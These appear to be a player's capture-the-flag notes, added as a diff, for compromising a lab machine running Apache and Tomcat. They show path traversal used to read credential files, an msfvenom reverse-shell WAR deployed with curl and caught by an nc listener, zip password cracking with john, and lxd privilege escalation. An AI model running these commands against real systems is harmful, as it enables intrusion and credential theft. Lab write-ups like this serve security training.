@@ -1,0 +1,136 @@
+---NMAP---
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---MASSCAN---
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 8080/tcp on 10.10.10.194                                  
+Discovered open port 80/tcp on 10.10.10.194                                    
+Discovered open port 22/tcp on 10.10.10.194  
+
+---GOBUSTER RESULTS---
+/ (common.txt):
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /.hta (Status: 403)
+  /.hta.php (Status: 403)
+  /.hta.txt (Status: 403)
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /assets (Status: 301)
+  /favicon.ico (Status: 200)
+  /files (Status: 301) *
+  /index.php (Status: 200)
+  /index.php (Status: 200)
+  /news.php (Status: 200) *
+  /Readme.txt (Status: 200) *
+  /server-status (Status: 403)
+
+/ (big.txt):
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /Readme.txt (Status: 200)
+  /assets (Status: 301)
+  /favicon.ico (Status: 200)
+  /files (Status: 301) *
+  /index.php (Status: 200)
+  /news.php (Status: 200)
+  /server-status (Status: 403)
+
+/files (common.txt/big.txt):
+  /.hta (Status: 403)
+  /.hta.php (Status: 403)
+  /.hta.txt (Status: 403)
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /archive (Status: 301)
+  /statement (Status: 200) *
+ 
+using port 8080 (tomcat)
+/ (common.txt + big.txt):
+  /docs (Status: 302)
+  /examples (Status: 302)
+  /manager (Status: 302) *login/pass req
+  /shell (Status: 302) *
+  /host-manager (Status: 302)
+  /index.html (Status: 200)
+
+/manager (common.txt + big.txt):
+  /html (Status: 401)
+  /images (Status: 302) *
+  /status (Status: 401)
+  /text (Status: 401)
+
+/host-manager (common.txt + big.txt):
+  /html (Status: 401)
+  /images (Status: 302)
+  /text (Status: 401)
+
+---trying to explore the /news.php?file=statment---
+/news.php?file=../../../../../etc/passwd
+in http://10.10.10.194:8080/ tells that the users are defined in /etc/tamcat9/tomcat-users.xml ///  /usr/share/tomcat9
+/news.php?file=../../../../../etc/tomcat9/tomcar-users.xml --nothing
+/news.php?file=../../../../../usr/share/doc/tomcat9-common/RUNNING.txt.gz
+*wget running.txt.gz
+found $CATALINA_HOME/conf/server.xml (no use atm)
+/news.php?file=../../../../../usr/share/tomcat9/etc/tomcar-users.xml:
+   <role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+successful login to 8080/host-manager/
+
+generating a WAR(WebApp Resource) file
+*msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.146 LPORT=5555 -f war > rshell.war
+uploading this file:
+*curl -v -u 'tomcat:$3cureP4s5w0rd123!' -T rshell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/rshell&update=true'
+
+listening socket
+*nc -lvp 5555
+executing rshell
+*wget 10.10.10.194:8080/rshell
+
+---PRIVESC---
+first get to the user ash
+
+found a backup file on /var/www/html/files/
+*wget /files/16162020_backup.zip
+using johnthereaper to decript
+*sudo zip2john 16162020_backup.zip >bkp_hash
+*sudo john bkp_hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
+*sudo john --show bkp_hash 
+	16162020_backup.zip:admin@it::16162020_backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip
+passwd = admin@it
+nothing on files
+trying to login into users on target
+root (access denied)
+ash (access conceded)
+done
+cat $HOME/user.txt
+
+*sudo -l
+Sorry, user ash may not run sudo on tabby.
+*id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+./linpeas.sh
+lxd group not normal
+on https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+
+using method 2
+kudos!
+cat /mnt/root/root/root.txt
